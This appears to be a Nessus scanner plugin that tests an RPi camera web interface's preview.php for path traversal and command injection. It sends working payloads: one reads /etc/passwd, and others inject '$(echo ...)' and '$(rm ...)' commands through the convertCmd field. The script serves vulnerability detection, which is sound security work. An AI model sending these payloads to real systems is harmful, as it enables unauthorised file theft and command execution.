###############################################################################
# Nessus Vulnerability Test
#
###############################################################################
include("compat.inc");

if(description)
{
  script_id(51799064);
  script_version("$Revision: 10852 $");
  script_name(english:"RPi Arbitrary File Download Vulnerability");
  script_category(ACT_GATHER_INFO);
  script_copyright("This script is Copyright (C) 2005 WEBRAY");
  script_family(english:"Camera");
  script_dependencies( "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"see_also", value:"https://www.exploit-db.com/exploits/42638/");
  script_set_attribute(attribute:"solution", value:"update to the new version");
  script_set_attribute(
    attribute:"description",
    value:"Detect the RPi Arbitrary File Download Vulnerability .");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


	port=get_http_port(default:80);
#	display("port=="+port+'\r\n');
	host = get_host_name();
url="/preview.php";
postdata1 ="download1=../../../../../../../../../../../../../../../../etc/passwd.v0000.t";
postdata2="convert=none&convertCmd=$(echo vlu55!!te12 > /tmp/v2qu55)";
postdata3="download1=../../../../../../../../../../../../../../../../tmp/v2qu55.v0000.t";
postdata4="convert=none&convertCmd=$(rm ../../../../../../../../../../../../../../../../tmp/v2qu55)";

function genreq(postdata,port){

		res = http_send_recv3(
		  port: port,
		  method: "POST",
		  item: url,
		  data: postdata,
		add_headers: make_array("Host",host,"Content-Type", "application/x-www-form-urlencoded")
		);
#display(postdata);
}
	port=get_http_port(default:80);
#	display("port=="+port+'\r\n');

genreq(postdata:postdata1,port:port);
		if(":0:0:root:"><res[2]){
			if (report_verbosity > 0)
			{
			  header = 'Arbitrary File Download with the following URL';
			  report = get_vuln_report(
				items  : url,
				port   : port,
				header : header
			  );
			  security_hole(port:port, extra:report);
			}
if (report_verbosity > 0) security_hole(port:port, extra:http_last_sent_request()+res[2]);
			  else security_hole(port);
		}
genreq(postdata:postdata2,port:port);
genreq(postdata:postdata3,port:port);
		if("vlu55!!te12"><res[2]){
			if (report_verbosity > 0)
			{
			  header = 'Arbitrary File Download & Arbitrary command execution with the following URL';
			  report = get_vuln_report(
				items  : url,
				port   : port,
				header : header
			  );
			  security_hole(port:port, extra:report);
			}
if (report_verbosity > 0) security_hole(port:port, extra:http_last_sent_request()+res[2]);
			  else security_hole(port);
		}
genreq(postdata:postdata4,port:port);
genreq(postdata:postdata3,port:port);
#display(res[2]);


exit(0);
